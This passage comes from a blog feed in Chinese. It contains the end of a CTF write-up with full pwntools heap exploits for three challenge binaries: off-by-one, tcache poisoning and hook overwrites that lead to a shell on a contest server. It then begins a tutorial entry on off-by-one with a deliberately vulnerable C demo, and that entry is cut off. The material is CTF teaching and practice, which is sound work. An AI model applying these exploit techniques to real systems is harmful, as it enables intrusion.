class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn5")</span></span><br><span class="line">heap = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"OK!"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#print(hex(heap.got['free']))</span></span><br><span class="line"><span class="comment">#add(0x10,"/bin/sh\x00")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN6-fail"><a href="#PWN6-fail" class="headerlink" title="PWN6(fail)"></a>PWN6(fail)</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#idx </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> <span class="comment">#sh.recvuntil('dele success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#leave message at bss</span></span><br><span class="line">sh.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>, <span class="string">'aa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">'aa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'aaaaaaa'</span>)<span class="comment">#edit this to ....</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaaaaa\x0a'</span>)</span><br><span class="line"><span class="comment">#sh.recv(8)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4ca8</span></span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_addr = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#h</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#x/30gx 0x602120 </span></span><br><span class="line"><span class="comment">#bss_ptr</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x88</span> * <span class="string">'a'</span> + <span class="string">'\xb1'</span>)<span class="comment">#</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'aaa'</span>)<span class="comment">#</span></span><br><span class="line">payload1 = <span class="number">0x20</span> * <span class="string">'a'</span> + <span class="string">'\x98'</span> + <span class="number">7</span> * <span class="string">'\x00'</span> + p64(free_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload1)</span><br><span class="line"><span class="comment">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class="line">one_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload2 = p64(one_addr)</span><br><span class="line">edit(<span class="number">4</span>,payload2)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">()</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">"important secret"</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendlineafter(<span class="string">'size&gt;&gt;'</span>,str(size))</span><br><span class="line"> p.sendlineafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line">enter()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">128</span>,<span class="string">"aaa"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">128</span>,<span class="string">"bbb"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> -libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">info(hex(sys))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"ccc"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">"ddd"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">"eee"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc8</span>,<span class="string">"fff"</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x602080</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment"># add(6,0x80,"ld1ng")</span></span><br><span class="line">edit(<span class="number">3</span>,p64(sys))</span><br><span class="line"><span class="comment">#p.sendline("ls")</span></span><br><span class="line"><span class="comment">#p.sendline("cat flag")</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN7-fail"><a href="#PWN7-fail" class="headerlink" title="PWN7(fail)"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn7")</span></span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10050'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#step1: 构造出0x200的pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment">#用到10个块</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#六个进入tcahce</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止top_chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line"> delete(i)<span class="comment">#pre_size分别为0x0,0x100,0x200 （这里合并了）</span></span><br><span class="line"><span class="comment">#到这里全部都free掉了，7个在tcache,3个在unsorted_bin</span></span><br><span class="line"><span class="comment">#step2: 把0x100放入tcache 并由块7进入unsorted_bin提供libc</span></span><br><span class="line"><span class="comment">#另外注意一下idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#占满tcache 这里是倒着的 6,5,4,3,2,1，x,x,x,0</span></span><br><span class="line"> add(<span class="number">0x8</span>,p64(i))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">7</span>)) <span class="comment">#切分unsorted_bin</span></span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">9</span>)) <span class="comment">#10个分配完毕</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#这里idx=6没有释放 也就是最上面的</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#进入tcache 带着0x100</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#进入unsorted_bin 提供Libc </span></span><br><span class="line">add(<span class="number">0xf8</span>, p64(<span class="number">0</span>)) <span class="comment">#这次分配的是idx=8的B块， 将C块的inuse位给清了</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#填满tcache</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#促使块合并，但块8还在使用</span></span><br><span class="line"><span class="comment">#step3: leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"> add(<span class="number">0x8</span>, p64(i))</span><br><span class="line">add(<span class="number">0x8</span> ,p64(<span class="number">7</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success((hex(libc_base)))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">target = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">log.success(hex(target))</span><br><span class="line">sys_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">one_addr = libc_base + <span class="number">0x4f432</span> <span class="comment">#0x4f2c5 </span></span><br><span class="line">add(<span class="number">0x10</span>, p64(target))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几个堆题有一个上次新生赛的原题，但就是做不出来</p><p>堆的东西还是不太熟悉，我tcl</p><p>马上考试了，先去复习了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;a href=&quot;#CUMTCTF2020岁末赛&quot; class=&quot;headerlink&quot; title=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;/a&gt;CUMTCTF2020岁末赛&lt;/h1&gt;&lt;p&gt;学长们可太搞了，比赛最后垂直上分可太秀了&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>堆漏洞及其利用</title>
    <link href="https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
    <id>https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/</id>
    <published>2020-12-22T13:17:06.000Z</published>
    <updated>2020-12-22T15:11:22.198Z</updated>
    
    <content type="html"><![CDATA[<p>堆基础和堆漏洞还是分开比较好</p><p>这样看着也比较整齐</p><h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><h2 id="0x01-Off-By-One"><a href="#0x01-Off-By-One" class="headerlink" title="0x01 Off By One"></a>0x01 Off By One</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。</p><h3 id="2-利用思路"><a href="#2-利用思路" class="headerlink" title="2.利用思路"></a>2.利用思路</h3><p>(1) 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p><p>(2) 溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。</p><h3 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);<span class="comment">//断点</span></span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个程序的问题在于strlen 在计算长度的时候不会把结束符 ‘\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\x00’ 也算上，所以就会造成 off by one。</p><p>我们先来调试一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png" alt="image-20201219141904042"></p><p>直接看堆情况 分配24字节上面为什么堆size为0x21也就是33字节 这个可以看上面的</p><p>因为它会把下面一个pre_size占用</p><p>输入24个A</p><p><img 